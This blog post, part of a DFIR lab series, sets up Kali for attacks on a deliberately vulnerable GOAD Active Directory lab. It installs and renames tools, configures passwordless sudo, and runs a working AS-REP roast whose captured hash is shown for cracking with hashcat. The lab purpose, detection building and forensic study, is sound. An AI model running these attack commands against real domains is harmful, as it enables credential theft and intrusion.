---
layout: post
title: "AD DFIR Lab — Part 7: The Night King Rises — Kali as the Attack Platform"
date: 2026-04-13 13:00:00 +0100
category: cases
lang: en
ref: case-ad-dfir-lab-part7
tags: [dfir, kali, impacket, bloodhound, certipy, lab]
description: "Preparing Kali to attack the domain: what kali-linux-default ships, what's missing, CD-ROM apt source issues, critical tools for GOAD (kerbrute, mitm6, certipy-ad, nxc), and end-to-end verification with a real AS-REP roast."
comments: true
---

*This is Part 7 of the [AD DFIR Lab]({% post_url en/2026-04-12-ad-dfir-lab-intro %}) series. We get Kali ready for the attacks in Phase 9.*

## kali-linux-default ships most things, but not everything

When we installed Kali in Part 2 with `kali-linux-default`, the usual offensive toolkit got installed: the whole Impacket suite, BloodHound, evil-winrm, Responder, Hashcat, John, Nmap... But when verifying for GOAD, a few critical tools were missing for the attacks we plan to run.

Quick check:

```bash
for tool in impacket-GetNPUsers impacket-GetUserSPNs impacket-secretsdump \
            impacket-psexec impacket-wmiexec certipy-ad bloodhound-python \
            evil-winrm nxc responder mitm6 kerbrute hashcat john \
            enum4linux-ng kinit; do
    which $tool &>/dev/null && echo "  OK  $tool" || echo "  MISS $tool"
done
```

Result:

```
  OK  impacket-GetNPUsers
  OK  impacket-GetUserSPNs
  OK  impacket-secretsdump
  OK  impacket-psexec
  OK  impacket-wmiexec
  OK  certipy-ad
  OK  bloodhound-python
  OK  evil-winrm
  OK  nxc
  OK  responder
  MISS  mitm6
  MISS  kerbrute
  OK  hashcat
  OK  john
  MISS  enum4linux-ng
  MISS  kinit
```

4 important tools missing:
- **mitm6** — IPv6 DNS takeover attacks
- **kerbrute** — AD user enumeration via Kerberos pre-auth
- **enum4linux-ng** — modern SMB/LDAP enum
- **kinit** (from `krb5-user`) — to manipulate Kerberos tickets manually

## Important tool name changes

Two classic tools have been renamed and still show up in outdated tutorials:

**`crackmapexec` → `nxc`**
```bash
# What you see in old tutorials:
crackmapexec smb 192.168.10.10 -u brandon.stark -p Password

# What actually works today:
nxc smb 192.168.10.10 -u brandon.stark -p Password
```

`crackmapexec` was abandoned in 2023 and the project was renamed to **NetExec (nxc)**. Kali no longer ships the old binary — it ships `nxc`.

**`certipy` → `certipy-ad`**
The original executable was `certipy`, now it's `certipy-ad`. Same project, but old scripts break.

## The CD-ROM apt sources problem

First surprise when running `sudo apt-get install mitm6`:

```
E: The repository 'cdrom://[Kali GNU/Linux 2026.1rc3 ...] kali-rolling Release'
   does not have a Release file.
E: Unable to locate package mitm6
```

Kali keeps the installer ISO as the **first source in `/etc/apt/sources.list`**. After install, apt keeps trying to read packages from a CD that no longer exists, and the HTTP repos aren't configured.

Fix:

```bash
# Comment out the cdrom line
sudo sed -i "s|^deb cdrom|# deb cdrom|" /etc/apt/sources.list

# Add the official HTTP repo
echo "deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware" \
    | sudo tee -a /etc/apt/sources.list

sudo apt-get update
```

Now:

```bash
sudo apt-get install -y mitm6 krb5-user enum4linux-ng
```

## kerbrute: not in the repos

`kerbrute` is a Go tool by **ropnop** (Ronnie Flathers) for enumerating AD users via Kerberos pre-auth. It's not in Kali's repos — it's distributed as a GitHub release binary:

```bash
sudo wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 \
    -O /usr/local/bin/kerbrute
sudo chmod +x /usr/local/bin/kerbrute
```

## NOPASSWD sudo for automation (lab only)

When we want to run commands on Kali from the Proxmox host via SSH, each `sudo` asks for the password interactively and breaks automation:

```
sudo: a terminal is required to read the password
```

In a lab (never in production) we can bypass this:

```bash
echo "kali ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/kali-nopasswd
sudo chmod 440 /etc/sudoers.d/kali-nopasswd
```

Now attack scripts can be launched from the hypervisor without interaction.

## End-to-end verification: AS-REP roast brandon.stark

Instead of just verifying that the tools got installed, we launch a **real attack** that touches every layer of the lab: pfSense NAT, domain DNS, DC Kerberos, Impacket on Kali. If this works, the tools work AND the lab networking is correct.

**brandon.stark** is vulnerable to AS-REP Roasting (`DoesNotRequirePreAuth=True` attribute set by GOAD). We can request an AS-REP ticket **without credentials** containing material encrypted with his NTLM hash:

```bash
# From Kali (192.168.20.100 on VLAN 20)
printf "brandon.stark\nsansa.stark\njon.snow\nrobb.stark\n" > /tmp/users.txt

impacket-GetNPUsers \
    -no-pass \
    -dc-ip 192.168.10.11 \
    -usersfile /tmp/users.txt \
    north.sevenkingdoms.local/
```

Result:

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:7c710c0d1bd2fe364beb69005e64178b$3ab66bbc1cca021c05dca3a01d09d19ad021dd9c794ff2c63e3f58b2bc32196324c59a858764680e8c74d1a90df4f6a114891664eeb757153322e3382abd43ca5f6b996c080b529c42f30c6ec10b6a688cd3cf9963f4911fb99d035857b1f1a1178bb507a3254f87d2f7a9fa86cae5e0f93a56f37d91080c3c865f0a9aa89fac0ca277cd4c72b3063b097efe86335f315dc9b5e222a157c4f882239a0bdcb1b5f676b16ab38c64fa8ec9ea081c06671c78b608700d3d047650d6963d3fb3c370cfe3064df2eee59941d0e2ae012b1b486005ed1384baff12da1ce961f48ea407c9ff15743276a80c9849fa11c55e5ed095bb324bde6c6347fc025247e8fcb86b3a352204da16

[-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jon.snow doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robb.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
```

This hash is crackable with hashcat (`-m 18200`) against a wordlist to recover brandon.stark's plaintext password. But what matters right now is **what we just validated**:

| Layer | Verified |
|-------|----------|
| **Kali → pfSense NAT** | Traffic from 192.168.20.100 came out as 192.168.10.2 ✅ |
| **pfSense → DC02** | Inter-VLAN routing works ✅ |
| **DNS** | Kali resolved `north.sevenkingdoms.local` via DC01 ✅ |
| **Kerberos** | DC02 processed the AS-REQ request ✅ |
| **Impacket** | Decoded the AS-REP and extracted the hash ✅ |
| **GOAD vuln** | brandon.stark has `DoesNotRequirePreAuth=True` ✅ |

A single command validates six layers of the stack. This is **the definitive proof that the lab is ready to attack**.

## Snapshot `clean-ad`

Before generating historical noise or running attacks, we take a **`clean-ad`** snapshot:

```bash
for VMID in 100 101 102 103 104 105 106 107 108; do
    qm snapshot $VMID clean-ad \
        --description "Fresh AD, Sysmon+auditd active, Kali tools ready, zero noise"
done
```

This snapshot represents the lab state with:
- ✅ Domains + trust + GOAD vulnerabilities
- ✅ Sysmon + audit policy + auditd
- ✅ Kali armed with all tools
- ❌ Zero historical traffic (logs only have events from the deploy itself)

It's the baseline for **studying TTPs in isolation** — when you launch a Kerberoast here, the events you see in Security.evtx are **only** from the Kerberoast. No interference.

### Gotcha: the snapshot must be taken BEFORE any test

My first version of `clean-ad` was **contaminated**. Why? Because I took it **after** the verification AS-REP roast. That test attack left an Event 4768 in DC02's Security.evtx with `brandon.stark` and encryption type `0x17` (RC4) — the exact signature of an AS-REP roast in the logs. In a supposedly "clean" snapshot that's a problem: any detection you build against clean-ad would flag an "attack" that wasn't one.

Post-hoc check:

```powershell
Get-WinEvent -FilterHashtable @{LogName="Security"; Id=4768} |
    Where-Object { $_.Message -match "brandon.stark" } |
    Select TimeCreated, Id
# TimeCreated             Id
# -----------             --
# 4/13/2026 8:39:44 AM  4768   ← the test!
```

Fix: revert the Windows VMs to the previous snapshot (`audit-configured`), leave Kali untouched (its state with tools installed is correct), and re-take `clean-ad` with clean Windows + armed Kali. ZFS snapshots per VM are independent, so we can revert some VMs and snapshot different states at the same "logical point".

**Rule**: any action that touches the domain leaves traces in EVTX. Run your tests **before** the target snapshot, not after.

The next step will be generating the opposite snapshot: an AD with **a year of simulated corporate activity** on top, where the same attacks hide among thousands of legitimate events. Both snapshots will serve different use cases:

- **`clean-ad`** → learn how each TTP looks, develop detections, teaching demos
- **`noisy-ad-1year`** → realistic threat hunting, timeline analysis, analyst training

---

*Next: [Part 7.5 — Keeping the Kingdoms Alive: Eval Licenses and Lab Longevity]({% post_url en/2026-04-13-ad-dfir-lab-part7-5-licenses %})*

*Previous: [Part 6 — Ravens and Whispers: Audit Configuration]({% post_url en/2026-04-13-ad-dfir-lab-part6-audit %})*
